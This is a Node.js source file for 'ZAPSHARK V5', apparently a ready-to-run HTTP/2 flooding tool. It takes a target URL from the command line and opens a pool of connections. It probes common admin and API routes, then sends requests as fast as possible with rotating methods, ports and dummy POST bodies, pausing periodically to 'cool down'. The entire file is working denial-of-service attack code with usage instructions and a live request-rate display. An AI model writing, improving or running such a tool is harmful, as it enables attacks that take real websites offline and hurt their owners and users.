const http2 = require('http2');
const http = require('http');
const https = require('https');
const os = require('os');
const { exec } = require('child_process');

class ZAPSHARK_V5 {
    constructor(targetUrl) {
        const url = new URL(targetUrl);
        this.baseUrl = targetUrl;
        this.hostname = url.hostname;
        this.protocol = url.protocol;
        this.status = "ATTACKING";
        this.totalRequests = 0;
        this.currentRPS = 0;
        this.startTime = Date.now();
        this.requestsSinceLastCalc = 0;
        this.lastRpsCalc = Date.now();
        this.running = true;
        
        // === CONNECTION SYSTEM ===
        this.connectionPool = [];
        this.connCount = 14; // Prime number
        this.maxStreamsPerConn = 1000;
        
        // === METHOD ROTATION ===
        this.methods = ['GET', 'HEAD', 'POST'];
        this.methodRatios = { 'GET': 0.89, 'HEAD': 0.10, 'POST': 0.01 };
        this.methodCounter = { 'GET': 0, 'HEAD': 0, 'POST': 0 };
        
        // === PORT ROTATION ===
        this.ports = [443, 80, 8080, 8443, 3000];
        this.currentPortIndex = 0;
        this.portChangeCounter = 0;
        this.portChangeThreshold = 10000; // Change every 10k requests
        
        // === ROUTE DISCOVERY ===
        this.discoveredRoutes = new Set(['/']);
        this.commonRoutes = [
            '/api', '/api/v1', '/api/v2', '/admin', '/login', '/dashboard',
            '/user', '/users', '/account', '/profile', '/settings',
            '/wp-admin', '/wp-login.php', '/administrator', '/backend',
            '/console', '/manager', '/system', '/config', '/test',
            '/debug', '/status', '/health', '/metrics', '/info',
            '/public', '/private', '/secure', '/auth', '/oauth',
            '/graphql', '/rest', '/soap', '/xmlrpc', '/rpc',
            '/index.php', '/index.html', '/home', '/main', '/app'
        ];
        this.routeDiscoveryActive = true;
        this.routeDiscoveryInterval = 30000; // Every 30 seconds
        
        // === RESPONSE TRACKING ===
        this.responseCodes = new Map();
        this.lastResponseCode = 200;
        
        // === MAINTENANCE ===
        this.lastMaintenance = Date.now();
        this.maintenanceInterval = 300000; // 5 minutes
        this.maintenanceDuration = 120000; // 2 minutes
        this.maintenanceActive = false;
        
        // === PAYLOAD FOR POST ===
        this.postPayloads = [
            'username=admin&password=test123',
            'email=test@test.com&token=abc123',
            'action=login&submit=true',
            'query=SELECT * FROM users',
            'data={"test":true,"id":123}'
        ];
        
        // === INTERVALS ===
        this.attackInterval = null;
        this.mainLoop = null;
        this.displayInterval = null;
        this.routeDiscoveryTimer = null;
    }

    // === INITIALIZATION ===
    async initialize() {
        console.log('=== ZAPSHARK V5 - STRATEGIC HAMMER ===');
        console.log('Target:', this.baseUrl);
        console.log('Connections:', this.connCount);
        console.log('Ports:', this.ports.join(', '));
        console.log('Methods:', this.methods.join('/'));
        console.log('='.repeat(60));
        
        // BUILD CONNECTION POOL
        this.buildConnectionPool();
        
        // INITIAL ROUTE DISCOVERY
        await this.discoverRoutes();
        
        // START SYSTEMS
        this.startSystems();
        
        // INITIAL DISPLAY
        this.updateDisplay();
    }

    // === CONNECTION POOL ===
    buildConnectionPool() {
        this.connectionPool = [];
        const targetUrl = this.getCurrentTargetUrl();
        
        for (let i = 0; i < this.connCount; i++) {
            try {
                const client = http2.connect(targetUrl, {
                    maxSessionMemory: 65536
                });
                
                client.setMaxListeners(1000);
                client.on('error', () => {});
                
                this.connectionPool.push(client);
            } catch (err) {
                // Retry later
            }
        }
    }

    getCurrentTargetUrl() {
        const port = this.ports[this.currentPortIndex];
        return `${this.protocol}//${this.hostname}:${port}`;
    }

    // === PORT ROTATION ===
    rotatePort() {
        this.portChangeCounter++;
        if (this.portChangeCounter >= this.portChangeThreshold) {
            this.currentPortIndex = (this.currentPortIndex + 1) % this.ports.length;
            this.portChangeCounter = 0;
            
            // REBUILD CONNECTIONS WITH NEW PORT
            this.connectionPool.forEach(client => {
                try { client.destroy(); } catch (err) {}
            });
            this.buildConnectionPool();
        }
    }

    // === ROUTE DISCOVERY ===
    async discoverRoutes() {
        if (!this.routeDiscoveryActive || this.maintenanceActive) return;
        
        console.log('[~] Discovering routes...');
        
        const promises = [];
        const discovered = new Set();
        
        // TEST COMMON ROUTES
        for (const route of this.commonRoutes) {
            promises.push(this.testRoute(route).then(found => {
                if (found) {
                    this.discoveredRoutes.add(route);
                    discovered.add(route);
                }
            }));
            
            // TEST WITH EXTENSIONS
            const extensions = ['', '.php', '.html', '.aspx', '.jsp', '/'];
            for (const ext of extensions) {
                promises.push(this.testRoute(route + ext).then(found => {
                    if (found) {
                        const fullRoute = route + ext;
                        this.discoveredRoutes.add(fullRoute);
                        discovered.add(fullRoute);
                    }
                }));
            }
        }
        
        await Promise.all(promises);
        
        if (discovered.size > 0) {
            console.log(`[+] Discovered ${discovered.size} new routes`);
        }
    }

    async testRoute(route) {
        return new Promise((resolve) => {
            const options = {
                hostname: this.hostname,
                port: 443,
                path: route,
                method: 'HEAD',
                timeout: 3000
            };
            
            const req = https.request(options, (res) => {
                const code = res.statusCode;
                if (code >= 200 && code < 500 && code !== 404) {
                    this.responseCodes.set(code, (this.responseCodes.get(code) || 0) + 1);
                    resolve(true);
                } else {
                    resolve(false);
                }
                res.destroy();
            });
            
            req.on('error', () => resolve(false));
            req.on('timeout', () => {
                req.destroy();
                resolve(false);
            });
            
            req.end();
        });
    }

    getRandomRoute() {
        const routes = Array.from(this.discoveredRoutes);
        if (routes.length === 0) return '/';
        return routes[Math.floor(Math.random() * routes.length)];
    }

    // === METHOD SELECTION ===
    getNextMethod() {
        const rand = Math.random();
        let cumulative = 0;
        
        for (const [method, ratio] of Object.entries(this.methodRatios)) {
            cumulative += ratio;
            if (rand <= cumulative) {
                this.methodCounter[method]++;
                return method;
            }
        }
        
        return 'GET'; // fallback
    }

    // === ATTACK SYSTEM ===
    sendRequest() {
        if (this.maintenanceActive || this.connectionPool.length === 0) return;
        
        const client = this.connectionPool[Math.floor(Math.random() * this.connectionPool.length)];
        if (!client) return;
        
        const method = this.getNextMethod();
        const route = this.getRandomRoute();
        
        try {
            const headers = {
                ':method': method,
                ':path': route,
                ':authority': this.hostname,
                'user-agent': 'Mozilla/5.0',
                'accept': '*/*'
            };
            
            // ADD HEADERS FOR POST
            if (method === 'POST') {
                headers['content-type'] = 'application/x-www-form-urlencoded';
                headers['content-length'] = '32';
            }
            
            const req = client.request(headers);
            
            if (method === 'POST') {
                const payload = this.postPayloads[Math.floor(Math.random() * this.postPayloads.length)];
                req.write(payload);
            }
            
            req.on('response', (headers) => {
                const code = headers[':status'];
                this.lastResponseCode = code;
                this.responseCodes.set(code, (this.responseCodes.get(code) || 0) + 1);
                req.destroy();
            });
            
            req.on('error', () => {
                req.destroy();
            });
            
            req.on('close', () => {
                this.totalRequests++;
                this.requestsSinceLastCalc++;
            });
            
            req.end();
            
        } catch (err) {
            this.totalRequests++;
            this.requestsSinceLastCalc++;
        }
    }

    // === MAINTENANCE SYSTEM ===
    checkMaintenance() {
        const now = Date.now();
        
        if (!this.maintenanceActive && now - this.lastMaintenance >= this.maintenanceInterval) {
            this.startMaintenance();
        }
        
        if (this.maintenanceActive && now - this.lastMaintenance >= (this.maintenanceInterval + this.maintenanceDuration)) {
            this.endMaintenance();
        }
    }

    startMaintenance() {
        console.log('\n[!] MAINTENANCE STARTED - COOLING 2 MINUTES [!]');
        this.status = "COOLING";
        this.maintenanceActive = true;
        
        // STOP ATTACKS
        if (this.attackInterval) {
            clearInterval(this.attackInterval);
            this.attackInterval = null;
        }
        
        // CLEAR CONNECTIONS
        this.connectionPool.forEach(client => {
            try { client.destroy(); } catch (err) {}
        });
        this.connectionPool = [];
        
        // FLUSH DNS
        exec('ipconfig /flushdns >nul 2>&1 || sudo dscacheutil -flushcache 2>/dev/null || true', () => {});
    }

    endMaintenance() {
        console.log('\n[+] MAINTENANCE COMPLETE - RESUMING ATTACK [+]');
        this.status = "ATTACKING";
        this.maintenanceActive = false;
        this.lastMaintenance = Date.now();
        
        // REBUILD CONNECTIONS
        this.buildConnectionPool();
        
        // RESTART ATTACK
        setTimeout(() => {
            this.startAttackLoop();
            // REDISCOVER ROUTES
            this.discoverRoutes();
        }, 1000);
    }

    // === DISPLAY ===
    calculateRPS() {
        const now = Date.now();
        const timeDiff = (now - this.lastRpsCalc) / 1000;
        
        if (timeDiff >= 0.9) {
            this.currentRPS = this.requestsSinceLastCalc / timeDiff;
            this.requestsSinceLastCalc = 0;
            this.lastRpsCalc = now;
        }
    }

    getTopResponseCodes() {
        const entries = Array.from(this.responseCodes.entries());
        if (entries.length === 0) return "200";
        
        // Sort by frequency
        entries.sort((a, b) => b[1] - a[1]);
        
        // Get top 3 codes
        const topCodes = entries.slice(0, 3).map(e => e[0]);
        return topCodes.join(', ');
    }

    getActivePortsCount() {
        const uniquePorts = new Set(this.ports.slice(0, this.currentPortIndex + 1));
        return uniquePorts.size;
    }

    getMethodDisplay() {
        const total = Object.values(this.methodCounter).reduce((a, b) => a + b, 0);
        if (total === 0) return "GET/HEAD/POST";
        
        const percentages = this.methods.map(m => {
            const percent = total > 0 ? (this.methodCounter[m] / total * 100).toFixed(0) : "0";
            return `${m}:${percent}%`;
        });
        
        return percentages.join(' ');
    }

    getTimeUntilMaintenance() {
        if (this.maintenanceActive) {
            const timeLeft = (this.maintenanceInterval + this.maintenanceDuration) - (Date.now() - this.lastMaintenance);
            const minutes = Math.floor(timeLeft / 60000);
            const seconds = Math.floor((timeLeft % 60000) / 1000);
            return `${minutes}:${seconds.toString().padStart(2, '0')}`;
        } else {
            const timeLeft = this.maintenanceInterval - (Date.now() - this.lastMaintenance);
            const minutes = Math.floor(timeLeft / 60000);
            const seconds = Math.floor((timeLeft % 60000) / 1000);
            return `${minutes}:${seconds.toString().padStart(2, '0')}`;
        }
    }

    updateDisplay() {
        this.calculateRPS();
        
        const runtime = Math.floor((Date.now() - this.startTime) / 1000);
        const minutes = Math.floor(runtime / 60);
        const seconds = runtime % 60;
        const runtimeStr = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
        
        process.stdout.write('\x1B[2J\x1B[0f');
        console.log(`ZAP-SHARK — (${runtimeStr}) | STATUS: ${this.status}`);
        console.log('============================');
        console.log(`SHARK-TRS — ${this.totalRequests.toLocaleString()}`);
        console.log(`SHARK-LHC — ${this.getTopResponseCodes()}`);
        console.log(`SHARK-RPS — ${this.currentRPS.toFixed(1)}`);
        console.log('============================');
        console.log(`Z-S | ROUTES: ${this.discoveredRoutes.size} | PORTS: ${this.getActivePortsCount()} | METHODS: ${this.getMethodDisplay()}`);
        console.log('============================');
        console.log(`Z-S | MAINTENANCE: ${this.getTimeUntilMaintenance()}`);
    }

    // === MAIN SYSTEMS ===
    startAttackLoop() {
        if (this.attackInterval) clearInterval(this.attackInterval);
        
        this.attackInterval = setInterval(() => {
            if (!this.maintenanceActive) {
                // SEND MULTIPLE REQUESTS PER TICK
                for (let i = 0; i < 5; i++) {
                    this.sendRequest();
                    this.rotatePort();
                }
            }
        }, 0.1);
    }

    startSystems() {
        // MAIN LOOP
        this.mainLoop = setInterval(() => {
            this.checkMaintenance();
        }, 1000);
        
        // DISPLAY UPDATE
        this.displayInterval = setInterval(() => {
            this.updateDisplay();
        }, 100);
        
        // ROUTE DISCOVERY
        this.routeDiscoveryTimer = setInterval(() => {
            if (!this.maintenanceActive) {
                this.discoverRoutes();
            }
        }, this.routeDiscoveryInterval);
        
        // START ATTACK
        this.startAttackLoop();
    }

    // === START ===
    start() {
        this.initialize();
        
        process.on('SIGINT', () => {
            console.log('\n\n=== ZAPSHARK V5 FINISHED ===');
            console.log(`Total Requests: ${this.totalRequests.toLocaleString()}`);
            console.log(`Peak RPS: ${this.currentRPS.toFixed(1)}`);
            console.log(`Discovered Routes: ${this.discoveredRoutes.size}`);
            console.log(`Methods Used: ${JSON.stringify(this.methodCounter)}`);
            console.log('='.repeat(40));
            
            this.running = false;
            clearInterval(this.mainLoop);
            clearInterval(this.displayInterval);
            clearInterval(this.attackInterval);
            clearInterval(this.routeDiscoveryTimer);
            
            this.connectionPool.forEach(client => {
                try { client.destroy(); } catch (err) {}
            });
            
            process.exit(0);
        });
    }
}

// USAGE
const target = process.argv[2];
if (!target || !target.startsWith('https://')) {
    console.log('Usage: node zapshark-v5.js https://target.com');
    process.exit(1);
}

const shark = new ZAPSHARK_V5(target);
shark.start();
